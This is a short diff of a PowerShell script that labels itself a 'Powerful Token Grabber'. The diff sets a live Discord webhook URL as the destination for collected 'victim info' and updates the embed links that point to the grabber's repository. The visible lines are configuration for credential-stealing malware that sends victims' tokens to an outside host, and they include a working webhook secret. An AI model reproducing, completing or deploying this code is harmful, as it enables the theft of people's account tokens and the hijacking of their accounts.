@@ -12,7 +12,7 @@ function Compare-Mutex {
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 
-$webhook = "YOUR_WEBHOOK_HERE"
+$webhook = "https://discord.com/api/webhooks/1191923124049031269/-R9bFrJNiCAswbYCynVw5GJECO7-zmePVieR5r49u6vnhJ-oU73M9stsOEFhJCc_RJBk"
 $debug_mode = $false
 $udc_mode = $true
 
@@ -665,11 +665,11 @@ function Backup-Data {
         "description" = "Powerful Token Grabber"
         "color" = "3447003"
         "avatar_url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
-        "url" = "https://discord.com/api/webhooks/1191923124049031269/-R9bFrJNiCAswbYCynVw5GJECO7-zmePVieR5r49u6vnhJ-oU73M9stsOEFhJCc_RJBk"
+        "url" = "https://discord.gg/vk3rBhcj2y"
         "embeds" = @(
             @{
                 "title" = "POWERSHELL GRABBER"
-                "url" = "https://github.com/benalec/Flipper/Token-Looter.ps1"
+                "url" = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
                 "description" = "New victim info collected !"
                 "color" = "3447003"
                 "footer" = @{
